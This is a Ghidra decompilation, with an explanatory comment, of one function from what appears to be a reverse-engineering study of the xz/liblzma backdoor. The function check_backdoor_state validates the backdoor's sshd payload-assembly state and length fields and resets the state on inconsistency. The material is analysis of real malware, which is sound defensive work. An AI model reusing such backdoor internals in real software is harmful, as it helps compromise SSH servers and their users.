// /home/kali/xzre-ghidra/xzregh/107EA0_check_backdoor_state.c
// Function: check_backdoor_state @ 0x107EA0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall check_backdoor_state(global_context_t * ctx)


/*
 * AutoDoc: Guards the payload assembly state machine. States 1–2 require a populated `sshd_payload_ctx` and a minimum payload length
 * (>=0xae) plus a sane body_length pulled from the decrypted header; state 3 tolerates either 3 or 4; and state 0 expects the
 * staging buffer to be empty. Any inconsistency zeros the state and sets it to 0xffffffff so the hooks know to discard buffered
 * data.
 */

#include "xzre_types.h"

BOOL check_backdoor_state(global_context_t *ctx)

{
  u32 uVar1;
  ulong uVar2;
  BOOL state_in_expected_range;
  BOOL state_matches_exact;
  sshd_payload_ctx_t *payload_ctx;
  u32 payload_length;
  
  if (ctx == (global_context_t *)0x0) {
    return FALSE;
  }
  uVar1 = ctx->payload_state;
  if ((int)uVar1 < 3) {
    if (0 < (int)uVar1) {
      if ((((ushort *)ctx->sshd_payload_ctx != (ushort *)0x0) && (0xad < ctx->current_data_size)) &&
         (uVar2 = (ulong)*(ushort *)ctx->sshd_payload_ctx, ctx->current_data_size <= uVar2)) {
        if (uVar2 <= uVar2 + 0x60) {
          uVar2 = uVar2 + 0x60;
        }
        if (uVar2 <= ctx->payload_data_size) {
          return TRUE;
        }
      }
      goto LAB_00107f11;
    }
    if (uVar1 != 0) goto LAB_00107f11;
    state_in_expected_range = ctx->current_data_size < 0xae;
    state_matches_exact = ctx->current_data_size == 0xae;
  }
  else {
    state_in_expected_range = uVar1 == 3;
    state_matches_exact = uVar1 == 4;
  }
  if (state_in_expected_range || state_matches_exact) {
    return TRUE;
  }
LAB_00107f11:
  ctx->payload_state = 0xffffffff;
  return FALSE;
}

